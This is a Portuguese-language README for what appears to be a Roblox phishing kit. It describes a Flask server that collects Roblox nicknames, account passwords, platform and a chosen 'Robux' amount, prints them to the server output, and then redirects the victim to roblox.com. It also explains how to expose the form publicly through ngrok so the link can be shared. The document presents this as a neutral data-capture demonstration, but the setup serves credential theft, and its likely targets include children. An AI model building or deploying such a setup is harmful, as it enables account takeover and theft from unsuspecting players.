# Captura de Dados de Formulário Web

Este projeto demonstra a captura de dados submetidos através de um formulário web simples. Ao interagir com a página, as informações inseridas nos seguintes campos são processadas pelo servidor backend:

* **Nickname do Roblox:** O identificador de usuário fornecido.
* **Senha da Conta:** A credencial de acesso inserida.
* **Plataforma:** A plataforma de jogo selecionada.
* **Robux Escolhido:** A opção de quantidade de Robux selecionada.
![image](https://github.com/user-attachments/assets/85c7ad55-65ca-411b-9426-440daecc1c6e)

## Modo de Uso

1.  **Configuração do Frontend (HTML)**
    * O arquivo `index.html` contém a estrutura do formulário web que coleta os dados do usuário. Este arquivo deve ser servido através de um servidor web para ser acessível em um navegador.

2.  **Configuração do Backend (Python)**
    * O script `app.py` implementa um servidor web utilizando o framework **Flask**. Este servidor escuta por requisições HTTP nos métodos `GET` e `POST`.
    * Ao receber uma requisição `GET` na rota principal (`/`), o servidor serve o arquivo `index.html`.
    * Ao receber uma requisição `POST` na mesma rota (`/`), o servidor processa os dados do formulário enviados pelo cliente. As informações são extraídas dos campos `nickname`, `password`, `plataforma`, e `robux_choice` e exibidas na saída do servidor.
    * Após o processamento dos dados via `POST`, o servidor configura um redirecionamento HTTP para o site oficial do Roblox (`https://roblox.com`).
    * **Pré-requisitos:** Certifique-se de ter o **Flask** instalado. Execute:
        ```bash
        pip install Flask
        ```
    * **Execução:** Navegue até o diretório do projeto no terminal e execute:
        ```bash
        python app.py
        ```
        O servidor Flask será iniciado (por padrão em `http://127.0.0.1:5500/`).

3.  **Exposição Externa (Ngrok)**
    * Para tornar o servidor localmente rodando acessível através da internet, a ferramenta **ngrok** pode ser utilizada.
    * Após instalar o **ngrok**, execute o comando:
        ```bash
        ngrok http 5500
        ```
        em um novo terminal.
    * O **ngrok** fornecerá um URL público (ex: `https://seu-subdominio.ngrok-free.app`) que pode ser compartilhado para acessar a interface do formulário.

4.  **Acesso e Interação**
    * Ao acessar o URL público do **ngrok** em um navegador, o usuário visualizará o formulário definido em `index.html`.
    * Ao preencher e submeter o formulário, os dados serão enviados para o servidor Flask em execução, onde serão processados e exibidos na saída do servidor. O navegador do usuário será então redirecionado para o site oficial do Roblox.

## Informações Adicionais

* Este projeto demonstra um fluxo básico de captura e processamento de dados de formulário em um ambiente web simples.
* A utilização do **ngrok** permite testar e demonstrar aplicações web locais através de URLs públicos.
* O redirecionamento para o site do Roblox após a submissão do formulário é uma ação configurada no backend.
